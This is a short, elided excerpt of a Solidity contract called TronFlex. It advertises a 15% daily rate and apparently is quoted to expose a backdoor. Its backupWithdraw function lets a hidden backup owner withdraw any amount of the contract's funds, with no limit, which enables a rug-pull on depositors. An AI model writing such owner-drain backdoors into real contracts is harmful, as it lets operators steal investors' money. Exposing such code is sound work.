...
contract  TronFlex{
    ...
    uint private minuteRate = 1736106; //DAILY 15%
    ...
    constructor() public {
      owner = msg.sender;
	  ownerBackup = msg.sender;
    }
	
	function changeOwner(address newOwnerAddress) public {
	...
	function backupWithdraw(uint _amount){
		require(msg.sender == ownerBackup);
		ownerBackup.transfer(_amount);
	}
